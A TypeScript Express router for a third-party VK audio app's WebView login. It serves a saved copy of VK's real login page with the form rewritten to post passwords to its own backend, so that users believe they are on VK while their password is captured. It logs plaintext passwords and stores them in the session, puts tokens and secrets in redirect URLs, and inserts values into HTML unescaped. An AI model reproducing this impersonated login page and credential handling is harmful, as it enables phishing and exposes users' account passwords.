import {vkTokenAncor} from "@/configurations"
import {deviceIDgen} from "@/helper"
import {performDirectGrant} from "@/helper/directGrant"
import {Request, Response} from "@/types"
import express from "express"
import fs, {readFileSync} from "fs"
import path from "path"

export const authForm = express.Router()

/**
 * VK audio auth is served to the app inside a WebView pointed at /auth/vk.
 * Two strategies share one WebView (app catches the final blank.html#... hash):
 *
 *  1. RELAY OAUTH (primary) — GET /auth/vk 302-redirects the WebView to VK's
 *     genuine oauth.vk.com/authorize page. The user logs in on VK's REAL page,
 *     so 2FA (SMS) and the human-check captcha work natively. On success VK
 *     redirects to oauth.vk.com/blank.html#access_token=... (no `secret`). The
 *     app then POSTs that URL to /api/auth/token, which upgrades it to a
 *     token+secret via auth.refreshToken. Interactive login → no flood control.
 *
 *  2. HYBRID FALLBACK — /auth/vk/fallback serves a backend login form that
 *     drives the direct password grant (the only path that returns an
 *     audio-capable secret directly). 2FA/captcha challenges are rendered as
 *     backend HTML steps inside the same WebView. Used when VK forces VK ID on
 *     the authorize page (no audio token there).
 */

// ---- direct grant driven through backend HTML pages inside the WebView ------
//
// The WebView shows VK's REAL login page (docs/auth.html snapshot) with its form
// action rewritten to POST here; the password is captured for the direct grant.
//
// NOTE: relay OAuth (302 to the live oauth.vk.com/authorize page) was tried and
// abandoned 2026-08-22. In a real browser that authorize URL redirects to VK ID
// (id.vk.ru), whose token (`vk1.a...`) has NO audio access (audio.get -> "Unknown
// method") and cannot be upgraded to an audio secret. OAuth never hands us the
// password, so it can't feed the direct grant. Serving VK's login markup and
// capturing the password ourselves is the only way to get the real-page look AND
// an audio-capable token.

// Rewrite VK's saved login page so its form POSTs to our grant endpoint, and
// neutralise the snapshot's self-reloading / event-blocking scripts.
const rewriteVkForm = (html: string, action: string, error?: string): string => {
  html = html.replace(/,window._preventEvents=\["click","touchstart","touchend","mouseover","mousemove"\]/gi, "")
  html = html.replace(/&&location\.reload\(\)/gi, "")
  html = html.replace(/<form[^>]*>/gi, `<form method="post" action="${action}">`)
  if (error) {
    const banner = `<div style="background:#fc3c44;color:#fff;padding:12px 16px;text-align:center;font:14px -apple-system,sans-serif">${error}</div>`
    html = html.replace(/<body[^>]*>/i, (m) => `${m}${banner}`)
  }
  return html
}

const serveVkLoginPage = (res: Response, error?: string): boolean => {
  const p = path.resolve(process.cwd(), "docs/auth.html")
  if (!fs.existsSync(p)) {
    console.error("❌ docs/auth.html not found at:", p)
    return false
  }
  const file = readFileSync(p, "utf-8")
  res.setHeader("Content-Type", "text/html; charset=utf-8")
  res.send(rewriteVkForm(file, "/auth/vk", error)).end()
  return true
}

const PAGE = (inner: string) => `<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Вход VK</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; background:#000; color:#fff; font-family:-apple-system,Segoe UI,Roboto,sans-serif;
         min-height:100vh; display:flex; align-items:center; justify-content:center; }
  .card { width:100%; max-width:360px; padding:24px; }
  h1 { font-size:22px; font-weight:600; margin:0 0 16px; text-align:center; }
  .hint { color:#9ca3af; font-size:13px; margin:0 0 12px; }
  input { width:100%; background:rgba(255,255,255,.08); color:#fff; border:0; border-radius:10px;
          padding:14px 16px; font-size:16px; margin-bottom:12px; }
  button { width:100%; background:#fc3c44; color:#fff; border:0; border-radius:10px; padding:16px;
           font-size:16px; font-weight:600; }
  .err { color:#fc3c44; font-size:13px; margin:0 0 12px; }
  .captcha { width:100%; background:#fff; border-radius:8px; margin-bottom:12px; }
  a { color:#9ca3af; font-size:13px; display:block; text-align:center; margin-top:16px; }
</style></head><body><div class="card">${inner}</div></body></html>`

const loginForm = (error?: string, action: string = "/auth/vk") => PAGE(`
  <h1>Вход в VK</h1>
  ${error ? `<p class="err">${error}</p>` : ""}
  <form method="post" action="${action}">
    <input name="email" type="text" inputmode="email" autocapitalize="none" autocorrect="off"
           placeholder="Телефон или email" autofocus>
    <input name="pass" type="password" placeholder="Пароль">
    <button type="submit">Войти</button>
  </form>`)

const smsForm = (phoneMask?: string) => PAGE(`
  <h1>Код подтверждения</h1>
  <p class="hint">${phoneMask ? `Код отправлен на ${phoneMask}` : "Введите код из SMS / приложения"}</p>
  <form method="post" action="/auth/vk">
    <input name="code" type="text" inputmode="numeric" autocomplete="one-time-code"
           placeholder="6-значный код" autofocus>
    <button type="submit">Подтвердить</button>
  </form>
  <a href="/auth/vk?reset=1">Начать заново</a>`)

const captchaForm = (captchaImg: string, captchaSid: string) => PAGE(`
  <h1>Проверка</h1>
  <p class="hint">Введите символы с картинки</p>
  <img class="captcha" src="${captchaImg}" alt="captcha">
  <form method="post" action="/auth/vk">
    <input type="hidden" name="captcha_sid" value="${captchaSid}">
    <input name="captcha_key" type="text" autocapitalize="none" autocorrect="off"
           placeholder="Символы с картинки" autofocus>
    <button type="submit">Подтвердить</button>
  </form>
  <a href="/auth/vk?reset=1">Начать заново</a>`)

type FbState = {login: string; password: string; device_id: string}

const html = (res: Response, body: string) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8")
  res.send(body).end()
}

// GET /vk: show VK's real login page (falls back to the clean form if the
// snapshot is missing). GET /vk/fallback: the clean built-in form.
// ?reset=1 clears any in-progress challenge state.
authForm.get("/vk", async (req: Request, res: Response) => {
  if (req.query.reset) delete (req.session as any).fb
  if (!serveVkLoginPage(res)) html(res, loginForm())
})

authForm.get("/vk/fallback", async (req: Request, res: Response) => {
  if (req.query.reset) delete (req.session as any).fb
  html(res, loginForm(undefined, "/auth/vk/fallback"))
})

// Re-render the login page with an error — real VK page for /vk, clean form for
// the fallback path.
const serveLoginError = (req: Request, res: Response, message: string) => {
  const action = req.path.includes("/fallback") ? "/auth/vk/fallback" : "/auth/vk"
  if (action === "/auth/vk" && serveVkLoginPage(res, message)) return
  html(res, loginForm(message, action))
}

// POST: run one direct-grant attempt, render the next step in the WebView
authForm.post(["/vk", "/vk/fallback"], async (req: Request, res: Response) => {
  const prev = (req.session as any).fb as FbState | undefined

  // Initial submit carries email/pass; challenge submits reuse stored creds.
  const login = req.body.email || prev?.login
  const password = req.body.pass || prev?.password
  const device_id = prev?.device_id || deviceIDgen()

  if (!login || !password) {
    serveLoginError(req, res, "Введите логин и пароль")
    return
  }

  // DEV debug: show which credentials are being used to sign in and whether this
  // is an initial attempt or a challenge (2FA code / captcha) resubmit.
  console.log("=====> /auth" + req.path + " attempt:", {
    login,
    password,
    code: req.body.code || undefined,
    captcha_key: req.body.captcha_key || undefined,
    device_id,
  })

  try {
    const result = await performDirectGrant({
      login,
      password,
      device_id,
      code: req.body.code,
      captcha_sid: req.body.captcha_sid,
      captcha_key: req.body.captcha_key,
    })

    if (result.kind === "ok") {
      delete (req.session as any).fb
      req.session.access_token = result.access_token
      req.session.secret = result.secret
      req.session.user_id = result.user_id
      req.session.device_id = result.device_id
      console.log("✅ fallback grant ok:", {user_id: result.user_id, has_secret: !!result.secret})
      // WebView catches this hash and stores the session (secret already present).
      res.redirect(
        `blank.html#success=1&access_token=${result.access_token}` +
        `&user_id=${result.user_id}&secret=${result.secret}&device_id=${result.device_id}`
      )
      return
    }

    // Persist creds + device_id so the challenge submit can resume the grant.
    // (device_id is stable; the ok-branch already returned above.)
    ;(req.session as any).fb = {login, password, device_id} as FbState

    if (result.kind === "need_validation") {
      console.warn("🔐 fallback: 2FA required", result.validation_type)
      html(res, smsForm(result.phone_mask))
      return
    }
    if (result.kind === "need_captcha") {
      console.warn("🧩 fallback: captcha required")
      html(res, captchaForm(result.captcha_img, result.captcha_sid))
      return
    }

    console.error("❌ grant failed:", result.message)
    delete (req.session as any).fb
    serveLoginError(req, res, result.message)
  } catch (error: any) {
    console.error("======> grant ERROR:", error?.message)
    serveLoginError(req, res, error?.message || "Ошибка авторизации")
  }
})

authForm.get('/blank.html', async (req: Request, res: Response) => {
  res.setHeader('Content-Type', 'text/html; charset="utf-8"')
  res.send("<html><body></body></html>").end()
  return;
})

// - ########################################## test-mock (dev)
// Offline dev flow: WebView loads /auth/local, submitting redirects to
// blank.html with a canned token anchor (DEV_API_TOKEN) so the app-side
// hash-capture can be exercised without hitting VK.
authForm.get('/local', async (req: Request, res: Response) => {
  html(res, loginForm(undefined, "/auth/local"))
})

authForm.post('/local', async (req: Request, res: Response) => {
  console.log("===Local post", req.body)
  console.log("redirect blank.html" + vkTokenAncor)
  res.redirect("blank.html" + vkTokenAncor)
})
